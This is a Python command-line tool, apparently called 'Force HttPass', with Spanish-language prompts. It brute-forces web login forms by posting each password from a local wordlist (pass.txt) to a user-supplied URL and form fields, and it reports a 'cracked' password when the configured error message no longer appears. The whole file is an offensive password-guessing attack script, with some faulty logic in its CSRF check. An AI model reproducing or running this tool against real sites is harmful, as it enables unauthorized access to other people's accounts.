#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import sys,time
import os
from colorama import Fore, Back, Style, init
init()

#colores
blanco = Fore.WHITE
rojo = Fore.RED
azul = Fore.BLUE
cyan = Fore.CYAN
verde = Fore.GREEN
amarillo = Fore.YELLOW
#stylo
stylo = Style.BRIGHT

os.system("clear")

#variables input
inpuName = input(f"{azul}User name{amarillo}={amarillo}' ")
url = input(f"{cyan}Url de Dominio:>>{verde} ")
inpuPass = input(f"{azul}Pass name{amarillo}={amarillo}' ")
inpuEnv = input(f"{azul}Envio name{amarillo}={amarillo}' ")
submit = input(f"{azul}Submit value name{amarillo}={amarillo}' ")
username = input(f"{cyan}Username:>>{verde} ")
error = input(f"{cyan}Tipo de error:>>{verde} ")

time.sleep(1.0)
os.system("clear")
#banner
banner = f"""
                {azul}Force HttPass
                 By: {verde}T3nshi
        https://github.com/garciarodrigue\n
    {rojo}VERIFICANDO DOMINIO PARA EL ATAQUE....\n
"""
for l in banner:
    sys.stdout.write(l)
    sys.stdout.flush()
    time.sleep(0.02)

#funcion de ataque pss.txt
try:
    def Bruto(username, url, error):
        count = 0
        for password in passwords:
            password = password.strip()
            count += 1
            print(f"{verde}{url}")
            print(f"{cyan}Probando Pass #{azul}" + str(count) + f"{cyan} Contraseña >> {azul}" + password)
            dat = {f'{inpuName}': username, f"{inpuPass}": password, f"{inpuEnv}": f"{submit}"}
            #dat = {'username': username, "password": password, "logId": "submit"}
            
            try:
                res = requests.post(url, data=dat)
                if error in str(res.content):
                    pass
                elif "CRSF" or "crsf" in str(res.content):
                    #print(str(res.content))
                    print(f"{rojo}Seguridad {verde}CRSF{verde} en la web no es posible FuerzaBruta")
                    sys.exit(0)
                    exit()
                else:
                    print(f"{blanco}Has crackeado la contraseña ")
                    print(f"{verde}La contraseña del usuario{blanco} " + username + f"{verde} es{blanco} " + password )
                    sys.exit(0)
                    exit()

            except:
                print(f"{rojo}Error al Hackear el Password\n ")
                print(f"{verde}{url} {rojo}No Penetrado!!")
                sys.exit(0)
                exit()
except:
    print(f"{rojo}Error de Coneccion: ")
with open("pass.txt", "r") as passwords:
    Bruto(username, url, error)

